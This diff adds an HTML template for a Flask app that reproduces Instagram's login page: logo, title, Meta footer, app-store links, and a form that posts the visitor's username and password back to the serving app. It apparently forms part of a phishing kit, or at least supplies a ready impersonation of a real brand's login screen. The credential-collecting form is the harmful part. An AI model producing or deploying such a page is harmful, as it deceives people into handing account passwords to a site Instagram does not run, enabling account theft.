@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="{{ url_for('static', filename='images/instagram_logo.png') }}" alt="Instagram Logo" class="logo">
+            <form method="POST">
+                <input type="text" name="username" placeholder="Phone number, username, or email" required>
+                <input type="password" name="password" placeholder="Password" required>
+                
+                <!-- Fixing Spacing -->
+                <div class="button-container">
+                    <button type="submit">Log in</button>
+                </div>
+
+                <!-- Added gap before Forgot password? -->
+                <div class="forgot-container">
+                    <a href="#" class="forgot">Forgot password?</a>
+                </div>
+            </form>
+        </div>
+
+        <div class="signup-box">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+
+        <div class="app-download">
+            <p>Get the app.</p>
+            <div class="store-buttons">
+                <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank">
+                    <img src="{{ url_for('static', filename='images/google_play.png') }}" alt="Get it on Google Play">
+                </a>
+                <a href="https://apps.microsoft.com/detail/9NBLGGH5L9XT" target="_blank">
+                    <img src="{{ url_for('static', filename='images/microsoft_store.png') }}" alt="Get it from Microsoft">
+                </a>
+            </div>
+            
+        </div>
+    </div>
+
+    <footer>
+        <p>
+            Meta &nbsp; About &nbsp; Blog &nbsp; Jobs &nbsp; Help &nbsp; API &nbsp; Privacy &nbsp; Terms &nbsp;
+            Locations &nbsp; Instagram Lite &nbsp; Threads &nbsp; Contact Uploading & Non-Users &nbsp; Meta Verified
+        </p>
+        <p>English &nbsp; © 2025 Instagram from Meta</p>
+    </footer>
+</body>
+</html>
